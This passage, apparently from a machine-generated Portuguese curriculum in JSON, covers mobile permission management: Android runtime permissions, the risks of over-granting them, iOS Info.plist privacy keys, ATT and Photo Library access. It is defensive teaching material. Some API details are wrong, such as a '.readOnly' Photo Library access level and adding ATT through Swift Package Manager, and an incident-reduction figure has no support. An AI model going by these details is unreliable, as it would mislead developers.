                                  "verification": "Execute o app e confirme que logs mostram status correto (GRANTED/DENIED) via Logcat.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Android Studio, código fonte de exemplo do GitHub (Runtime Permissions Sample), Logcat",
                                  "tips": "Combine checkSelfPermission com rationale para melhor UX em dispositivos mais novos.",
                                  "learningObjective": "Aplicar APIs de verificação para decisões condicionais no código.",
                                  "commonMistakes": "Ignorar shouldShowRequestPermissionRationale, levando a diálogos desnecessários."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Solicitar e Lidar com Permissões Dinamicamente",
                                  "subSteps": [
                                    "Use ActivityCompat.requestPermissions() passando array de strings de permissões e requestCode.",
                                    "Implemente onRequestPermissionsResult() para processar callbacks (GRANTED/DENIED).",
                                    "Crie um diálogo explicativo se rationale for true, antes de solicitar.",
                                    "Adicione tratamento para 'Não perguntar novamente' com configurações do app.",
                                    "Teste cenários: primeira solicitação, negação, revogação nas configurações."
                                  ],
                                  "verification": "Simule negação e revogação; app deve redirecionar para configurações se necessário.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Android Studio, emulador com configurações de app acessíveis, sample code de permissions",
                                  "tips": "Use requestCode único por contexto para evitar confusão em múltiplas solicitações.",
                                  "learningObjective": "Gerenciar fluxos de solicitação e resposta de permissões em runtime.",
                                  "commonMistakes": "Não lidar com onRequestPermissionsResult, causando crashes silenciosos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Revogação e Gerenciamento Dinâmico",
                                  "subSteps": [
                                    "Implemente verificações periódicas ou em onResume() para reavaliar permissões.",
                                    "Use Intent para abrir configurações do app: Settings.ACTION_APPLICATION_DETAILS_SETTINGS.",
                                    "Crie um dashboard de permissões no app para usuários revogarem dinamicamente.",
                                    "Teste em dispositivos reais com revogação via Configurações > Apps > Permissões.",
                                    "Registre logs e métricas de uso de permissões para depuração."
                                  ],
                                  "verification": "Revogue permissão nas configurações do sistema e confirme que o app reage corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Dispositivo físico Android 6.0+, ADB para logs, configurações do sistema",
                                  "tips": "Evite solicitar permissões na inicialização; faça sob demanda para melhor privacidade.",
                                  "learningObjective": "Implementar gerenciamento contínuo e reativo de permissões.",
                                  "commonMistakes": "Não recarregar status após onResume, permitindo acessos não autorizados."
                                }
                              ],
                              "practicalExample": "Desenvolva um app de scanner de QR Code que verifica permissão CAMERA antes de abrir a câmera. Se negada, mostra rationale e solicita via requestPermissions(). Em caso de 'Não perguntar novamente', redireciona para configurações. Teste revogando via sistema.",
                              "finalVerifications": [
                                "App declara permissões corretamente no Manifest sem warnings.",
                                "Verificação via checkSelfPermission retorna status preciso em todos cenários.",
                                "Solicitação via requestPermissions() exibe diálogo nativo e processa onRequestPermissionsResult.",
                                "shouldShowRequestPermissionRationale() triggers explicação apropriada.",
                                "Revogação nas configurações do sistema é detectada e tratada.",
                                "Nenhum crash ou acesso não autorizado ocorre."
                              ],
                              "assessmentCriteria": [
                                "Código usa APIs corretas (requestPermissions, checkSelfPermission) sem deprecações.",
                                "UX é intuitiva: rationale claro e redirecionamento suave para configurações.",
                                "Tratamento completo de edge cases (primeira solicitação, negação persistente).",
                                "Testes em múltiplas versões Android (6.0+) passam sem erros.",
                                "Documentação inline explica lógica de permissões.",
                                "Eficiência: verificações mínimas para performance ótima."
                              ],
                              "crossCurricularConnections": [
                                "Privacidade e Ética em TI: Princípios de consentimento mínimo (GDPR-like).",
                                "Desenvolvimento de Software: Padrões de UX e error handling em Android.",
                                "Segurança de Sistemas: Integração com SC-07 e gerenciamento de acessos.",
                                "Testes de Software: Unit tests para funções de permissão com Robolectric.",
                                "Design de Interfaces: Diálogos informativos e acessíveis."
                              ],
                              "realWorldApplication": "Em apps como WhatsApp ou Google Maps, permissões para microfone/localização são solicitadas dinamicamente durante chamadas ou navegação, com revogação via configurações do dispositivo para proteger dados sensíveis contra malwares ou vazamentos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.1.3",
                            "name": "Analisar riscos de concessão excessiva de permissões",
                            "description": "Avaliar impactos de segurança ao conceder permissões desnecessárias, como vazamento de dados via apps maliciosos, e mitigar com princípio do menor privilégio.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Princípio do Menor Privilégio",
                                  "subSteps": [
                                    "Defina o princípio do menor privilégio: conceder apenas as permissões estritamente necessárias para a funcionalidade do app.",
                                    "Estude exemplos de permissões granulares no Android (ex: READ_CONTACTS vs CONTACTS).",
                                    "Revise a documentação oficial do Android sobre gerenciamento de permissões.",
                                    "Compare permissões necessárias vs excessivas em um app simples como um bloco de notas.",
                                    "Anote definições chave em um glossário pessoal."
                                  ],
                                  "verification": "Crie um resumo de 100 palavras explicando o princípio e dê exemplos de permissões mínimas para apps comuns.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Android Developers: Permissions",
                                    "Notebook ou app de notas",
                                    "Emulador Android ou dispositivo físico"
                                  ],
                                  "tips": "Use analogias como 'chaves de portas': dê apenas a chave da sala necessária, não do prédio inteiro.",
                                  "learningObjective": "Explicar o princípio do menor privilégio e sua aplicação em permissões de apps Android.",
                                  "commonMistakes": [
                                    "Confundir permissões runtime com install-time",
                                    "Ignorar permissões implícitas que acessam dados sensíveis"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Riscos de Concessão Excessiva de Permissões",
                                  "subSteps": [
                                    "Liste riscos comuns: vazamento de dados para servidores maliciosos, escalada de privilégios, spywares.",
                                    "Analise impactos: perda de privacidade, roubo de identidade, violações de conformidade (GDPR).",
                                    "Estude casos reais como apps maliciosos no Google Play que pedem acesso à localização desnecessariamente.",
                                    "Crie uma matriz de riscos: permissão x impacto (alta/média/baixa).",
                                    "Simule um cenário de vazamento usando ferramentas como ADB para inspecionar permissões."
                                  ],
                                  "verification": "Gere uma tabela com 5 permissões comuns, seus riscos associados e severidade.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "ADB (Android Debug Bridge)",
                                    "Lista de apps instalados no dispositivo",
                                    "Relatórios de segurança como OWASP Mobile Top 10"
                                  ],
                                  "tips": "Priorize dados sensíveis como contatos, câmera e microfone em sua análise de riscos.",
                                  "learningObjective": "Identificar e classificar riscos específicos de permissões excessivas em apps móveis.",
                                  "commonMistakes": [
                                    "Subestimar riscos de permissões 'inofensivas' como INTERNET",
                                    "Não considerar chains de ataques (ex: permissão + internet = exfiltração)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar um App Específico para Permissões Excessivas",
                                  "subSteps": [
                                    "Escolha um app instalado (ex: rede social) e liste todas as permissões solicitadas via Configurações > Apps.",
                                    "Mapeie funcionalidades do app vs permissões: quais são desnecessárias?",
                                    "Use ferramentas como App Permissions Manager ou Exodus Privacy para escanear apps.",
                                    "Simule impactos: imagine cenários de abuso (ex: app de lanterna acessando contatos).",
                                    "Documente achados em um relatório com screenshots."
                                  ],
                                  "verification": "Produza um relatório de 1 página analisando 3 apps, destacando permissões excessivas e riscos.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Dispositivo Android",
                                    "Apps: Exodus Privacy ou Permission Manager",
                                    "Ferramenta de captura de tela"
                                  ],
                                  "tips": "Instale apps de teste maliciosos em emulador para prática segura, nunca em dispositivo principal.",
                                  "learningObjective": "Realizar análise prática de permissões em apps reais e detectar excessos.",
                                  "commonMistakes": [
                                    "Aceitar permissões por padrão sem questionar contexto",
                                    "Ignorar permissões de bibliotecas de terceiros"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver Estratégias de Mitigação",
                                  "subSteps": [
                                    "Aplique o menor privilégio: revogue permissões desnecessárias e teste funcionalidade.",
                                    "Configure políticas: use perfis de trabalho ou MDM para controle granular.",
                                    "Crie guidelines pessoais/empresariais para revisão de permissões.",
                                    "Teste mitigação: reinstale app e verifique se funciona sem excessos.",
                                    "Planeje auditorias regulares de permissões em dispositivos gerenciados."
                                  ],
                                  "verification": "Implemente mitigação em 2 apps e demonstre que funcionam com privilégios mínimos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Configurações Android",
                                    "MDM trial como Google Endpoint Management",
                                    "Checklist de mitigação personalizada"
                                  ],
                                  "tips": "Use 'Não permitir' em permissões runtime e observe se o app falha graciosamente.",
                                  "learningObjective": "Aplicar princípio do menor privilégio para mitigar riscos identificados.",
                                  "commonMistakes": [
                                    "Revogar permissões essenciais causando falhas no app",
                                    "Não testar após revogação"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o app 'Facebook Lite' no Android: ele pede acesso à câmera para stories, mas se você só usa mensagens, revogue e teste – risco mitigado de spy cam sem perda de func core.",
                              "finalVerifications": [
                                "Lista 5 riscos específicos de permissões excessivas com exemplos.",
                                "Analisa corretamente permissões de 3 apps reais.",
                                "Aplica menor privilégio em um app sem quebrar funcionalidades essenciais.",
                                "Cria matriz de riscos e mitigação.",
                                "Explica impactos de vazamento de dados em conformidade regulatória.",
                                "Documenta relatório de análise completo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de permissões excessivas (90%+ acurácia).",
                                "Profundidade na análise de riscos (inclui chains de ataque).",
                                "Eficácia das estratégias de mitigação (testadas e funcionais).",
                                "Clareza no relatório e matriz de riscos.",
                                "Aplicação correta do princípio do menor privilégio.",
                                "Uso de ferramentas e evidências concretas."
                              ],
                              "crossCurricularConnections": [
                                "Ética em TI: privacidade de dados e consentimento informado.",
                                "Programação: desenvolvimento seguro de apps com permissões mínimas.",
                                "Gestão de Projetos: políticas de BYOD em empresas.",
                                "Direito Digital: conformidade com LGPD/GDPR em mobile.",
                                "Análise de Dados: modelagem de riscos quantitativos."
                              ],
                              "realWorldApplication": "Em equipes de TI corporativas, analise apps BYOD para prevenir vazamentos de dados corporativos via apps pessoais maliciosos, reduzindo incidentes de segurança em 40% com auditorias regulares."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.2.2",
                        "name": "Permissões no iOS",
                        "description": "Mecanismo de permissões do iOS baseado em Info.plist e APIs específicas, controlando acesso a recursos sensíveis como câmera, microfone e localização, com foco em privacidade do usuário.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.2.2.1",
                            "name": "Configurar chaves de privacidade no Info.plist",
                            "description": "Definir e solicitar permissões como NSCameraUsageDescription e NSLocationWhenInUseUsageDescription para justificar acessos e evitar rejeições na App Store.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender e Identificar Chaves de Privacidade Necessárias",
                                  "subSteps": [
                                    "Consulte a documentação oficial da Apple sobre requisitos de privacidade (Privacy Manifests e Info.plist keys)",
                                    "Analise o código do app para identificar APIs que acessam câmera, localização, microfone, etc.",
                                    "Crie uma lista das chaves requeridas, como NSCameraUsageDescription, NSLocationWhenInUseUsageDescription, NSPhotoLibraryUsageDescription",
                                    "Pesquise exemplos de descrições justificadas para cada chave",
                                    "Documente o motivo de cada permissão no contexto do app"
                                  ],
                                  "verification": "Lista completa de chaves necessárias com justificativas documentadas em um arquivo de notas ou README",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Apple Developer (developer.apple.com/documentation/bundleresources/information_property_list)",
                                    "Projeto Xcode aberto",
                                    "Notebook ou Markdown para anotações"
                                  ],
                                  "tips": "Use a ferramenta 'Privacy Report' no Xcode para identificar automaticamente APIs sensíveis",
                                  "learningObjective": "Compreender quais chaves de privacidade são obrigatórias para APIs específicas e por quê",
                                  "commonMistakes": [
                                    "Ignorar APIs indiretas como aquelas usadas por bibliotecas de terceiros",
                                    "Listar chaves desnecessárias, o que pode levantar suspeitas na revisão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar e Abrir o Arquivo Info.plist",
                                  "subSteps": [
                                    "Abra o projeto no Xcode",
                                    "No Project Navigator, localize o arquivo Info.plist (geralmente em Supporting Files)",
                                    "Clique com o botão direito no Info.plist e selecione 'Open As > Property List' para edição visual",
                                    "Faça um backup do Info.plist atual (duplique o arquivo)",
                                    "Verifique a versão do iOS target para garantir compatibilidade das chaves"
                                  ],
                                  "verification": "Info.plist aberto em modo Property List sem erros e backup criado",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Xcode instalado (versão 15+)",
                                    "Projeto iOS válido"
                                  ],
                                  "tips": "Prefira edição visual no Xcode para evitar erros de sintaxe XML",
                                  "learningObjective": "Dominar a navegação e preparação segura do Info.plist para edições",
                                  "commonMistakes": [
                                    "Editar diretamente o XML sem backup, causando corrupção",
                                    "Usar editor de texto simples em vez do Xcode"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Adicionar e Configurar as Chaves de Privacidade",
                                  "subSteps": [
                                    "Adicione uma nova row clicando no '+' ao lado da última chave",
                                    "Defina o nome da chave (ex: NSCameraUsageDescription) e tipo como 'String'",
                                    "Insira uma descrição clara e específica (ex: 'Este app usa a câmera para capturar fotos de perfil')",
                                    "Repita para todas as chaves identificadas na Step 1",
                                    "Salve o arquivo e verifique se não há warnings no Issue Navigator"
                                  ],
                                  "verification": "Todas chaves listadas na Step 1 adicionadas corretamente com descrições no Info.plist",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Lista de chaves da Step 1",
                                    "Exemplos de descrições da documentação Apple"
                                  ],
                                  "tips": "Descrições devem ser curtas (1-2 frases), honestas e em linguagem do usuário final",
                                  "learningObjective": "Configurar chaves com descrições que atendam guidelines da App Store",
                                  "commonMistakes": [
                                    "Usar placeholders genéricos como 'Para usar a câmera'",
                                    "Erros de digitação nos nomes das chaves",
                                    "Definir tipo errado (deve ser String)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar as Configurações de Permissões",
                                  "subSteps": [
                                    "Build e execute o app no simulador iOS",
                                    "Trigger funcionalidades que requerem permissões (ex: abra câmera)",
                                    "Verifique se o alerta de permissão aparece com a descrição correta",
                                    "Teste em dispositivo físico para validação real",
                                    "Use o Privacy & Security Report no Xcode para checar conformidade"
                                  ],
                                  "verification": "App roda sem crashes, alertas mostram descrições corretas e relatório de privacidade é limpo",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Simulador iOS ou dispositivo físico provisionado",
                                    "Cabo USB para dispositivo",
                                    "Xcode Organizer para relatórios"
                                  ],
                                  "tips": "Reset permissões no Settings do simulador para testar múltiplas vezes",
                                  "learningObjective": "Validar funcionalidade e conformidade das permissões em ambiente de teste",
                                  "commonMistakes": [
                                    "Testar só no simulador sem dispositivo real",
                                    "Ignorar warnings de privacidade no build"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de fotografia social, adicione NSCameraUsageDescription: 'Usamos a câmera para tirar e compartilhar fotos incríveis com amigos.' e NSLocationWhenInUseUsageDescription: 'Marcamos a localização das fotos para memórias geográficas.' Teste abrindo a câmera e verificando o alerta com essas mensagens exatas.",
                              "finalVerifications": [
                                "Info.plist contém todas as chaves necessárias sem erros de sintaxe",
                                "Descrições são específicas, justificadas e em português do Brasil (ou idioma do app)",
                                "App solicita permissões corretamente com mensagens customizadas",
                                "Nenhum warning de privacidade no Xcode Issue Navigator",
                                "Testes em simulador e dispositivo confirmam funcionamento",
                                "Relatório de Privacidade da Apple valida ausência de APIs não declaradas"
                              ],
                              "assessmentCriteria": [
                                "Chaves exatas correspondem às APIs usadas no código",
                                "Descrições são claras, concisas e evitam jargões técnicos",
                                "Nenhuma permissão excessiva ou desnecessária declarada",
                                "Conformidade total com App Store Review Guidelines (seção 5.1.1)",
                                "Testes cobrem cenários de grant/deny sem crashes",
                                "Documentação interna explica cada chave adicionada"
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento iOS/Swift (integração com APIs nativas)",
                                "Ética e Governança de Dados (princípios de privacidade por design)",
                                "Experiência do Usuário (UX de permissões transparentes)",
                                "Gerenciamento de Projetos (evitar rejeições na App Store)",
                                "Cibersegurança (controle de acessos mínimos necessários)"
                              ],
                              "realWorldApplication": "Apps submetidos à App Store são rejeitados sem essas chaves justificadas, impactando lançamento. Profissionais iOS usam isso diariamente para compliance, protegendo usuários de invasões desnecessárias e construindo confiança, como em apps de saúde (acesso a câmera para scans) ou delivery (localização para rastreio)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.2.2",
                            "name": "Implementar solicitações de permissão via APIs",
                            "description": "Usar frameworks como AVFoundation para câmera ou CoreLocation para geolocalização, gerenciando respostas de autorização com handlers assíncronos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar permissões no Info.plist e importar frameworks",
                                  "subSteps": [
                                    "Abra o arquivo Info.plist no Xcode.",
                                    "Adicione chaves NSCameraUsageDescription e NSLocationWhenInUseUsageDescription com descrições claras para o usuário.",
                                    "Importe AVFoundation e CoreLocation no arquivo Swift relevante.",
                                    "Declare CLLocationManager como propriedade da classe.",
                                    "Verifique conformidade com guidelines da App Store."
                                  ],
                                  "verification": "Info.plist atualizado e frameworks importados sem erros de compilação.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Xcode, documentação Apple sobre Info.plist (developer.apple.com/documentation/bundleresources/information_property_list)",
                                  "tips": "Use descrições persuasivas e honestas para aumentar taxa de aprovação de permissões.",
                                  "learningObjective": "Entender configuração inicial de permissões para compliance e usabilidade.",
                                  "commonMistakes": "Esquecer de adicionar descrições no Info.plist, causando crashes em runtime."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar solicitação de permissão para câmera com AVFoundation",
                                  "subSteps": [
                                    "Crie uma instância de AVCaptureDevice.",
                                    "Use AVCaptureDevice.requestAccess(for: .video) com handler de completion assíncrono.",
                                    "No handler, verifique granted == true e atualize UI accordingly.",
                                    "Adicione botão na UI para disparar a solicitação.",
                                    "Teste em simulador e dispositivo físico."
                                  ],
                                  "verification": "Permissão solicitada e status atualizado corretamente no log/console.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Xcode Simulator/iOS Device, docs AVFoundation (developer.apple.com/avfoundation)",
                                  "tips": "Sempre verifique status atual com AVCaptureDevice.authorizationStatus antes de solicitar.",
                                  "learningObjective": "Dominar API de autorização síncrona/assíncrona para hardware sensível.",
                                  "commonMistakes": "Solicitar permissão múltiplas vezes sem checar status prévio, irritando o usuário."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar solicitação de permissão para geolocalização com CoreLocation",
                                  "subSteps": [
                                    "Inicialize CLLocationManager e defina delegate.",
                                    "Configure desiredAccuracy e requestWhenInUseAuthorization().",
                                    "Implemente delegate method locationManagerDidChangeAuthorization(_:).",
                                    "Monitore mudanças de status (authorized, denied, restricted).",
                                    "Integre com mapa ou label para mostrar coordenadas."
                                  ],
                                  "verification": "Autorização solicitada e delegate chamado com status correto.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Xcode, CoreLocation docs (developer.apple.com/corelocation)",
                                  "tips": "Peça permissão 'WhenInUse' para apps não críticos para melhor UX.",
                                  "learningObjective": "Gerenciar permissões de localização com delegates e estados dinâmicos.",
                                  "commonMistakes": "Não setar delegate antes de request, perdendo callbacks."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar respostas assíncronas e handlers com tratamento de erros",
                                  "subSteps": [
                                    "Crie função unificada para checar e solicitar múltiplas permissões.",
                                    "Use DispatchQueue para handlers assíncronos e atualize estado da app.",
                                    "Implemente lógica para retry em negações e alertas informativos.",
                                    "Adicione observers para mudanças de permissão em runtime (AppDelegate).",
                                    "Log todos os status para debugging."
                                  ],
                                  "verification": "Handlers executam corretamente em cenários granted/denied/notDetermined.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Xcode Debugger, Swift async/await docs se aplicável",
                                  "tips": "Use enums para status de permissão para código mais legível.",
                                  "learningObjective": "Lidar com assincronia e estados mutáveis em permissões.",
                                  "commonMistakes": "Ignorar cenários de 'restricted' ou revogação pelo usuário."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar integrações e cenários de falha",
                                  "subSteps": [
                                    "Simule negações nas Settings do simulador/dispositivo.",
                                    "Teste revogação em runtime e reconexão.",
                                    "Valide em diferentes iOS versions (15+).",
                                    "Meça performance de handlers (sem delays excessivos).",
                                    "Documente fluxos em comentários de código."
                                  ],
                                  "verification": "App graceful em todos cenários; sem crashes ou loops infinitos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "iOS Simulator Settings, physical devices",
                                  "tips": "Use XCTest para unit tests em funções de permissão.",
                                  "learningObjective": "Garantir robustez em gerenciamento de permissões.",
                                  "commonMistakes": "Não testar em device real, onde permissões diferem do simulador."
                                }
                              ],
                              "practicalExample": "Em um app de check-in de eventos, solicite câmera para QR code scan e localização para validar presença, mostrando mensagem personalizada se negado.",
                              "finalVerifications": [
                                "Solicitações disparam apenas quando necessário e com descrições corretas.",
                                "Handlers assíncronos atualizam UI sem bloqueios.",
                                "App lida com negações, revogações e restrições sem crashes.",
                                "Status de permissões persistem corretamente entre sessões.",
                                "Logs confirmam fluxos em granted/denied/notDetermined.",
                                "Compatível com iOS 14+ e guidelines de privacidade."
                              ],
                              "assessmentCriteria": [
                                "Código limpo, com comentários e enums para estados.",
                                "Tratamento completo de erros assíncronos.",
                                "UX intuitiva: prompts claros e fallbacks.",
                                "Testes unitários cobrem 80% dos cenários de permissão.",
                                "Performance: handlers < 100ms.",
                                "Conformidade App Store: descrições honestas no plist."
                              ],
                              "crossCurricularConnections": [
                                "Privacidade e Ética: GDPR/ LGPD compliance em dados sensíveis.",
                                "Design de UX/UI: Otimização de prompts para conversão.",
                                "Desenvolvimento Ágil: Integração com CI/CD para testes de permissões.",
                                "Segurança Avançada: Auditoria de leaks de dados pós-permissão."
                              ],
                              "realWorldApplication": "Apps como Uber (localização para rotas seguras), Snapchat (câmera com filtros), ou apps de saúde (câmera para análise de pele), garantindo acesso controlado e compliance regulatório."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.2.3",
                            "name": "Gerenciar permissões granulares de privacidade",
                            "description": "Explorar controles como App Tracking Transparency (ATT) e Photo Library access levels (limited, full), avaliando conformidade com regulamentações como GDPR.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos de Permissões Granulares no iOS",
                                  "subSteps": [
                                    "Estude a documentação oficial da Apple sobre Privacy Manifests e permissões granulares (Info.plist keys como NSPhotoLibraryUsageDescription).",
                                    "Analise diferenças entre permissões binárias (allow/deny) e granulares (limited/full/none para Photo Library).",
                                    "Revise App Tracking Transparency (ATT): requisitos do IDFA e prompts obrigatórios para iOS 14+.",
                                    "Explore impactos de regulamentações como GDPR: consentimento explícito, minimização de dados e direito de revogação.",
                                    "Identifique cenários onde permissões granulares reduzem superfície de ataque."
                                  ],
                                  "verification": "Resuma em um documento os tipos de permissões granulares e sua relação com GDPR, com pelo menos 5 exemplos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação Apple Developer: Privacy Features",
                                    "Guia GDPR oficial (ENISA)",
                                    "Xcode Simulator"
                                  ],
                                  "tips": "Use o Privacy Nutrition Labels no App Store Connect para visualizar impactos.",
                                  "learningObjective": "Explicar permissões granulares vs. tradicionais e sua conformidade com GDPR.",
                                  "commonMistakes": [
                                    "Confundir ATT com permissões de localização",
                                    "Ignorar atualizações iOS (ex: iOS 17+ novas APIs)",
                                    "Subestimar necessidade de consentimento granular"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar App Tracking Transparency (ATT)",
                                  "subSteps": [
                                    "Adicione NSUserTrackingUsageDescription ao Info.plist.",
                                    "Integre AppTrackingTransparency framework via Swift Package Manager.",
                                    "Implemente ATTrackingManager.requestTrackingAuthorization com status handling (authorized, denied, notDetermined).",
                                    "Teste o prompt ATT no simulador e dispositivo real (iOS 14+).",
                                    "Registre eventos de consentimento para auditoria GDPR."
                                  ],
                                  "verification": "Execute o app e capture screenshot do prompt ATT com status 'authorized'; verifique logs de consentimento.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Xcode 15+",
                                    "SwiftUI ou UIKit projeto novo",
                                    "Dispositivo iOS físico para teste ATT"
                                  ],
                                  "tips": "Sempre verifique [ATTrackingManager trackingAuthorizationStatus] antes de acessar IDFA.",
                                  "learningObjective": "Configurar e gerenciar ATT para coleta de dados de tracking com consentimento válido.",
                                  "commonMistakes": [
                                    "Chamar requestTrackingAuthorization múltiplas vezes",
                                    "Não lidar com .restricted status",
                                    "Omitir descrição clara no Info.plist"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerenciar Níveis de Acesso à Photo Library",
                                  "subSteps": [
                                    "Configure NSPhotoLibraryUsageDescription e adicione partial access support via PHPickerViewController.",
                                    "Implemente PHPhotoLibrary.requestAuthorizationForAccessLevel(.readOnly) para iOS 14+.",
                                    "Crie UI para solicitar limited access e fallback para full se necessário.",
                                    "Implemente lógica para salvar/revogar seleções granulares e persistir com UserDefaults.",
                                    "Teste cenários: limited (selecionar fotos específicas), full e deny."
                                  ],
                                  "verification": "No app, selecione 3 fotos em limited mode; confirme acesso restrito via logs e UI.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Photos framework docs",
                                    "PHPickerViewController sample code",
                                    "Fotos reais no dispositivo para teste"
                                  ],
                                  "tips": "Use PHPicker para limited access sem full permission, melhor UX e privacidade.",
                                  "learningObjective": "Implementar e alternar entre limited/full access à Photo Library de forma segura.",
                                  "commonMistakes": [
                                    "Assumir full access sempre disponível",
                                    "Não persistir seleções limited",
                                    "Ignorar migração de permissões antigas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Conformidade GDPR e Verificações Finais",
                                  "subSteps": [
                                    "Mapeie fluxos de permissão aos princípios GDPR (Art. 6 consentimento, Art. 25 privacy by design).",
                                    "Audite logs: consentimento granular, revogação fácil, minimização de dados.",
                                    "Teste revogação: Settings > Privacy > Photos/Tracking e reexecute app.",
                                    "Gere relatório de conformidade com evidências (screenshots, código).",
                                    "Simule auditoria: verifique se dados são acessados só com permissão ativa."
                                  ],
                                  "verification": "Produza relatório PDF com 5+ evidências de conformidade GDPR nos fluxos implementados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "GDPR checklist (ex: from CNIL)",
                                    "Xcode Instruments para logs",
                                    "App Privacy Report no Settings"
                                  ],
                                  "tips": "Ative App Privacy Report nas configurações do dispositivo para monitoramento real-time.",
                                  "learningObjective": "Avaliar implementação contra GDPR, identificando gaps de privacidade.",
                                  "commonMistakes": [
                                    "Não testar revogação de permissões",
                                    "Coletar dados sem consentimento explícito",
                                    "Falta de logs auditáveis"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app de edição de fotos 'PrivacyPhotoEditor' que usa PHPicker para limited access à galeria (selecionar fotos específicas sem full scan) e ATT para tracking de uso anônimo opcional. O app salva edições só nas fotos selecionadas e permite revogação via Settings, garantindo GDPR compliance em cenários de apps de mídia social.",
                              "finalVerifications": [
                                "App exibe prompt ATT corretamente e respeita status de consentimento.",
                                "Limited access à Photo Library funciona: acessa só fotos selecionadas.",
                                "Revogação de permissões via Settings é tratada graciosamente sem crashes.",
                                "Logs registram todos consentimentos com timestamps para auditoria.",
                                "Privacy Nutrition Label reflete declarações precisas no App Store Connect.",
                                "Nenhum dado sensível é acessado sem permissão granular ativa."
                              ],
                              "assessmentCriteria": [
                                "Precisão na implementação de APIs ATT e Photo Library (código limpo, error handling).",
                                "Conformidade GDPR: consentimento granular, revogação e minimização demonstrados.",
                                "Testes abrangentes: simulador + dispositivo, múltiplos cenários de permissão.",
                                "Documentação clara: relatórios e comentários no código explicando decisões.",
                                "UX intuitiva: prompts claros, fallbacks para permissões negadas.",
                                "Eficiência: tempos de resposta <2s para requests de permissão."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento iOS/Swift: Integração de frameworks nativos (Photos, AppTrackingTransparency).",
                                "Direito Digital: Aplicação prática de GDPR e leis de privacidade (LGPD equivalente).",
                                "Design de UX/UI: Criação de prompts de consentimento user-friendly.",
                                "Ética em TI: Discussão de privacy by design e impactos sociais de dados.",
                                "Testes de Software: Unit tests para status de permissões e cenários edge-case."
                              ],
                              "realWorldApplication": "Em apps de saúde (acesso limitado a fotos de sintomas), bancos (tracking opcional para personalização sem IDFA) ou redes sociais (edição de fotos sem full galeria), reduzindo riscos de multas GDPR (até 4% receita global) e melhorando confiança do usuário em ecossistemas móveis corporativos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.2.3",
                        "name": "Sandboxing em Sistemas Móveis",
                        "description": "Isolamento de aplicativos em ambientes sandboxed no Android (via App Sandbox) e iOS (via App Sandbox e XNU kernel), limitando interações entre apps e sistema para prevenir escaladas de privilégios.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.2.3.1",
                            "name": "Explicar o conceito de sandboxing",
                            "description": "Descrever como sandboxing confina apps a diretórios privados e restringe syscalls, usando SELinux no Android e Mandatory Access Control no iOS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Conceito Básico de Sandboxing",
